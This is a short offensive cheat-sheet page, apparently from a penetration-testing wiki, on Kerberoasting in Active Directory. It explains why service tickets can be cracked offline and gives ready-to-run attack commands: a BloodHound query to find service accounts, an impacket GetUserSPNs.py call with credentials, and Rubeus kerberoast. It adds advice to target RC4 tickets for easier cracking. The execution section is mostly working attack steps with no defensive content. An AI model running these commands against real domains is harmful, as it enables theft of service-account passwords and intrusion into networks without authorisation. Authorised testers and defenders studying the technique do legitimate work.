# Kerberoasting

Any authenticated domain user can request a service ticket for any registered SPN. That ticket is encrypted with the service account's password hash, so requesting tickets for every SPN-bearing user account yields a set of offline-crackable hashes.

## Why It Works

Kerberos does not check whether you are authorised to use a service before issuing a ticket for it — authorisation happens at the service. Service accounts frequently have old, human-chosen passwords that never expire, so the cracking odds are good.

## Prerequisites

* Any valid domain credential
* Kerberos (88/TCP) reachable on a DC

## Execution

**Kerberoasting**

* `MATCH (u:User) WHERE u.hasspn=true AND u.enabled = true AND NOT u.objectid ENDS WITH '-502' AND NOT COALESCE(u.gmsa, false) = true AND NOT COALESCE(u.msa, false) = true RETURN u` [\[tool\]](https://github.com/SpecterOps/BloodHound)
* `GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
  * **→ Hash TGS**
* `Rubeus.exe kerberoast` [\[tool\]](https://github.com/GhostPack/Rubeus)

{% hint style="info" %}
Prefer targeting accounts with RC4-encrypted tickets (`$krb5tgs$23$`) — AES tickets (`$krb5tgs$17$`/`$18$`) crack far more slowly.
{% endhint %}

## Related

* [AS-REP Roasting](file:///9685693/credential-access/as-rep-roasting.md) — the pre-auth equivalent
* [Hash Cracking Reference](file:///9685693/credential-access/hash-cracking-reference.md) — mode 13100 for RC4, 19700 for AES
